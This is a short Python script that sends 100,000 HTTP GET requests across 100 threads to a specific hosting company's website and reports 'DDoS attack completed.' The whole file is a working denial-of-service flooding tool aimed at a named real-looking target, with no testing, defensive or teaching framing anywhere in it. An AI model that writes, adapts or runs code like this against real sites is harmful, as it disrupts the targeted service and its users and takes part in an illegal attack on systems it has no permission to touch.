import requests
import threading

# Target website URL
url = "https://mena-hosting.net/"

# Number of threads to use
num_threads = 100

# Number of requests per thread
num_requests = 1000

# Function to send HTTP requests
def send_request():
    for _ in range(num_requests):
        try:
            response = requests.get(url)
            print("Request sent to", url, "Status:", response.status_code)
        except:
            pass

# Create multiple threads to send requests
threads = []
for _ in range(num_threads):
    t = threading.Thread(target=send_request)
    t.daemon = True
    threads.append(t)

# Start the threads
for t in threads:
    t.start()

# Wait for all threads to complete
for t in threads:
    t.join()

print("DDoS attack completed.")
